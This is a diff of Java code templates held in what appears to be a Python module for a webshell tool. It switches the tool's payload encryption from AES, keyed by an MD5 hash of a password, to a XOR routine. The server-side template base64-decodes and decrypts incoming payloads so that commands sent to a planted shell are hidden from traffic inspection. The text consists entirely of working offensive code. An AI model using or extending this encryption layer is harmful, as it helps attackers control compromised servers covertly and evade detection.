@@ -1,12 +1,14 @@
-# AES-128-ECB-PKCS7-MD5
+# XOR-MD5
 code = """
     private byte[] cipher(
         byte[] payload, String alg, byte[] key, boolean isEnc
     ) {
         try {
-            javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(alg);
-            c.init(isEnc?1:2, new javax.crypto.spec.SecretKeySpec(key, alg));
-            return c.doFinal(payload);
+            byte[] result = new byte[payload.length];
+            for (int i = 0; i < result.length; i++) {
+                result[i] = (byte) (payload[i] ^ key[i + 1 & 15]);
+            }
+            return result;
         } catch (Exception e) {
             return null;
         }
@@ -25,7 +27,7 @@ code = """
 
     private byte[] decoder(String payload) {
         return cipher(
-            b64decode(payload), "AES",
+            b64decode(payload), "XOR",
             hasher(password, "MD5").substring(0, 16).getBytes(), false
         );
     }
@@ -36,7 +38,6 @@ proc = """
             Object decoder;
             byte[] bytes = null;
             java.security.MessageDigest h;
-            javax.crypto.Cipher c;
 
             try {
                 base64 = Class.forName("java.util.Base64");
@@ -60,7 +61,9 @@ proc = """
             byte[] key = new BigInteger(1, h.digest()).toString(16)
                 .substring(0, 16).getBytes();
 
-            c = javax.crypto.Cipher.getInstance("AES");
-            c.init(2, new javax.crypto.spec.SecretKeySpec(key, "AES"));
-            bytes = c.doFinal(bytes);
+            byte[] result = new byte[bytes.length];
+            for (int i = 0; i < result.length; i++) {
+                result[i] = (byte) (bytes[i] ^ key[i + 1 & 15]);
+            }
+            bytes = result;
 """
